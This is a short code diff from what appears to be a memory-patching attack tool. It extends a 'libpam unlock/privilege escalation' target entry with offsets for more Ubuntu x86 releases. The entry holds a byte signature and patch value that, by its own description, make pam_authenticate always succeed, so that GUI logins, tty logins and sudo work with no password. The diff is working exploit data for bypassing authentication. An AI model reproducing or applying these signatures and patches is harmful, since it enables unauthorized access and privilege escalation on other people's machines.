@@ -260,7 +260,7 @@ targets = [{'OS': 'Windows 8',
             'architectures': ['x86', 'x64'],
             'name': 'libpam unlock/privilege escalation',
             'notes': 'Overwrites the pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
-            'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f], # 11.10, 11.04, 12.04 x86
+            'signatures': [{'offsets': [0xa6d, 0xebd, 0x9e8, 0xbaf, 0xa7f], # 10.10, 10.04, 11.10, 11.04, 12.04 x86
                             'chunks': [{'chunk': 0x83f81f89c774,
                                         'internaloffset': 0x00,
                                         'patch': 0xbf00000000eb,
